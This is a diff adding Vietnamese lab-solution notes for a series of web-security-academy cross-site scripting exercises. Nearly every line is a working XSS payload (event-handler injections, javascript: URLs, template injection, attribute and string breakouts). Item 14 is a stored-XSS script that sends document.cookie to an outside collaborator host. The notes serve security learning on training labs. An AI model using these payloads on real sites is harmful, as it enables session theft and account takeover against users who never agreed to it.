@@ -2,7 +2,30 @@
 
 2: Nhập nội dung ở câu 1 vào comment và post comment
 
-3:
+3: (XEM SOLUTION) "><svg onload=alert(1)>
+
+4: ""><img src=1 onerror=alert(document.domain)>
+
+5: https://0a4200bc03dad49cc01f313f00c3004e.web-security-academy.net/feedback?returnPath=javascript:alert(document.domain) 
+
+thêm vào sau returnPath để hiện thông báo về domain
+
+6: <iframe src="https://0a6b0048038c450dc0a4a4d2004d0023.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+Cho phần trên vào body của exploit server và chọn 'Deliver exploit to victim'
+
+7: " autofocus onfocus=alert(document.domain) a="
+
+8: Vào post và tạo comment với nội dung, tên và email ngẫu nhiên còn website là : javascript:alert(1) 
+
+9: '; alert() // 
+
+10: https://0ac100290471b7c9c08c18b7003b0000.web-security-academy.net/product?productId=1&storeId=%3C/option%3E%3C/select%3E%3Cimg%20src=1%20onerror+=+alert()%3E
+
+11: (XEM SOLUTION) {{$on.constructor('alert()')()}} điền vào searchbox
+
+12: \"-alert(1)}// điền vào searchbox
+
+13: để nội dụng comment thành <><img+src=1+onerror=alert(document.domain)>
 
 14: Thử và thấy có thể inject được phần comment của web, ta thêm vào nội dung comment như sau:
 </p><script>fetch('https://onfpoqbji8qlb1r6z86jwk4tkkqbe32s.oastify.com',{method:'POST',mode:'no-cors',body:document.cookie});</script>
